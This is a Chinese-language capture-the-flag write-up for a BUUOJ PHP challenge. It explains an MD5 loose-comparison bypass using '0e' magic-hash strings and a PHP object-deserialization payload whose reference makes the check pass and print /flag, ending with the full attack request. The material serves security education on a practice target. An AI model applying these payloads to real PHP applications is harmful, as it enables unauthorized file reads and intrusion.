
**启动靶机，访问目标地址：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251014185002207.png)

```php
<?php  
/**  
 * Created by PhpStorm.  
 * User: jinzhao  
 * Date: 2019/10/6  
 * Time: 8:04 PM  
 */  
  
highlight_file(__FILE__);  
  
class BUU {  
   public $correct = "";  
   public $input = "";  
  
   public function __destruct() {  
       try {           $this->correct = base64_encode(uniqid());  
           if($this->correct === $this->input) {  
               echo file_get_contents("/flag");  
           }  
       } catch (Exception $e) {  
       }  
   }  
}  
  
if($_GET['pleaseget'] === '1') {  
    if($_POST['pleasepost'] === '2') {  
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {            unserialize($_POST['obj']);  
        }  
    }  
}
```

---
**分析代码：**
```c
首先，需要get方式传递pleaseget==1
第二，需要post方式传递pleasepost==2
第三，需要传入的md51参数和md52参数的值不相同但是其对应的md5值弱相等
// 在php中，==为弱相等， === 为强相等
前三个条件满足以后，才会反序列化传入的参数obj，由于obj参数可控，可以构造反序列化数据使得BUU中的/flag能被读取
第四，在BUU中，当correct和input的值相等时，才会读取/flag文件，但是correct会被base64_encode(uniqid())动态赋值 -> 可以直接让input引用correct
```

**绕过 MD5 弱类型比较**
在 PHP 中：

- `==` 会进行**类型转换**后再比较；
- `===` 才是严格比较（值和类型都相同）。

而 `md5()` 函数在处理某些特殊字符串时，**返回值可能以 `0e` 开头**（科学计数法形式），例如：
```c
md5('240610708')  // 输出: 0e462097431906509019562988736854
md5('QNKCDZO')   // 输出: 0e830400451993494058024219903391
```
这些字符串看起来不同，但它们的 MD5 值都是形如 `0e...` 的**纯数字科学计数法字符串**。

而在 PHP 的弱类型比较中：
```c
"0e123" == "0e456"  // true！
```
因为 PHP 会把两个字符串都当作**数字**来比较：

- `0e123` → `0 × 10^123` = `0`
- `0e456` → `0 × 10^456` = `0`
- 所以 `0 == 0` → **true**

但原始字符串 `'240610708' != 'QNKCDZO'` → 满足 `$_POST['md51'] != $_POST['md52']`

**还可以直接使用已知的MD5 魔术字符串：**

| md51        | md52       |
| ----------- | ---------- |
| `240610708` | `QNKCDZO`  |
| `aabg7XSs`  | `aabC9RqS` |
| `aaK1STfY`  | `aaO8zKZF` |
| `aa1C9Zee`  | `aa2C9Zee` |

```php
md51 = 240610708
md52 = QNKCDZO
```

**构造反序列化对象：**
利用 引用（Reference），让 `$input` 成为 `$correct` 的引用，这样当 `$correct` 被赋新值时，`$input` 自动同步
```php
$a = new BUU();
$a->input = &$a->correct;
```
序列化后得到：
```php
O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251014190824408.png)

**最后构造完整的请求：**
```
POST /?pleaseget=1 HTTP/1.1

Host: 265d366d-cece-432c-b817-7a1c0e29da55.node5.buuoj.cn:81

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 11

  

pleasepost=2&md51=240610708&md52=QNKCDZO&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251014193954090.png)

